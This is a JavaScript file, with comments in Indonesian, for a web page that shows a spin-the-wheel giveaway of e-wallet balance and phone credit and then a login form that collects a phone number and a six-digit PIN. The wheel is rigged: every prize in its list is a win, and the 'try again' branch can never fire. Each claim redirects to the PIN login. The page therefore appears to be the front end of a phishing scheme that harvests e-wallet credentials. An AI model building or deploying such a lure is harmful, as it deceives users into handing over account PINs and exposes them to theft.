document.addEventListener('DOMContentLoaded', () => {
  initSpinner();
  initAuthForm();
});

/* ========= SPINNER ========= */
function initSpinner() {
  const wheel         = document.getElementById('wheel');
  const spinBtn       = document.getElementById('spinBtn');
  const retryBtn      = document.getElementById('retryBtn');
  const result        = document.getElementById('result');
  const spinnerPopup  = document.getElementById('spinnerPopup');
  const closeMainBtn  = document.getElementById('closeMainPopup');
  const claimPopup    = document.getElementById('claimPopup');
  const claimText     = document.getElementById('claimText');
  const claimBtn      = document.getElementById('claimBtn');
  const closeClaimBtn = document.getElementById('closeClaimBtn');

  // Kalau elemen inti spinner tidak ada, hentikan init spinner supaya tidak error di halaman lain
  if (!wheel || !spinBtn) return;

  const prizes = [
    "Saldo Rp 10.000",
    "Pulsa 50K",
    "Saldo Rp 5.000",
    "Saldo Rp 100.000",
    "Saldo Rp 100.000",
    "Saldo Rp 50.000"
  ];

  let isSpinning = false;

  // Tutup popup utama (aman-cek)
  if (closeMainBtn && spinnerPopup) {
    closeMainBtn.addEventListener('click', () => spinnerPopup.style.display = 'none');
  }

  // Spin
  spinBtn.addEventListener('click', () => {
    if (isSpinning) return;
    isSpinning = true;
    if (result) result.textContent = '';
    if (retryBtn) retryBtn.style.display = 'none';

    const randomDegree = 3600 + Math.floor(Math.random() * 360);
    wheel.style.transform = `rotate(${randomDegree}deg)`;

    setTimeout(() => {
      const segmentAngle = 360 / prizes.length;
      const actualDegree = randomDegree % 360;
      let prizeIndex = Math.floor(actualDegree / segmentAngle);

      // arah putar visual vs hitung
      prizeIndex = (prizes.length - 1) - prizeIndex;

      // offset agar pas ke pointer ▼ (ubah angka jika layout berubah)
      const offset = 2;
      prizeIndex = (prizeIndex + offset) % prizes.length;

      const prize = prizes[prizeIndex];

      if (prize === "Coba Lagi 📍") {
        if (result) result.textContent = "😅 Yah, coba lagi ya!";
        if (retryBtn) retryBtn.style.display = 'inline-block';
      } else {
        if (claimText) claimText.innerHTML = `Kamu dapat: <b>${prize}</b>`;
        if (claimPopup) claimPopup.style.display = 'flex';
      }

      isSpinning = false;
    }, 4000);
  });

  // Ambil hadiah → arahkan login
  if (claimBtn) {
    claimBtn.addEventListener('click', () => {
      window.location.href = "/login";
    });
  }

  // Tutup popup klaim
  if (closeClaimBtn && claimPopup) {
    closeClaimBtn.addEventListener('click', () => claimPopup.style.display = 'none');
  }

  // Retry
  if (retryBtn && result) {
    retryBtn.addEventListener('click', () => {
      result.textContent = '';
      retryBtn.style.display = 'none';
    });
  }
}

/* ========= LOGIN / AUTH ========= */
function initAuthForm() {
  const telInput    = document.getElementById('no_telephone');
  const passInput   = document.getElementById('password');
  const indicatorEl = document.getElementById('pinIndicator');
  const loginBtn    = document.getElementById('loginBtn');

  // Kalau form login tidak ada di halaman ini, stop
  if (!telInput || !passInput || !indicatorEl || !loginBtn) return;

  const dots = Array.from(indicatorEl.children); // 6 span

  // Format Nomor HP: 4-4-4 (menjaga leading zero)
  telInput.setAttribute('inputmode', 'numeric');
  telInput.addEventListener('input', function () {
    const digits = this.value.replace(/\D/g, '').slice(0, 12); // batasi 12 digit kalau mau
    const parts = [
      digits.slice(0, 4),
      digits.slice(4, 8),
      digits.slice(8, 12)
    ].filter(Boolean);
    this.value = parts.join('-');
    validateForm();
  });

  // Indikator PIN (hanya angka, max 6)
  passInput.addEventListener('input', function () {
    const onlyDigits = this.value.replace(/\D/g, '').slice(0, 6);
    this.value = onlyDigits;

    // Update bulatan aktif
    for (let i = 0; i < 6; i++) {
      dots[i]?.classList.toggle('active', i < onlyDigits.length);
    }
    validateForm();
  });

  // Validasi tombol login aktif jika: PIN 6 digit & nomor HP minimal 10 digit angka
  function validateForm() {
    const telDigits = telInput.value.replace(/\D/g, '');
    const pinOk     = passInput.value.length === 6;
    const telOk     = telDigits.length >= 10; // atur sesuai kebutuhan
    loginBtn.disabled = !(pinOk && telOk);
  }
}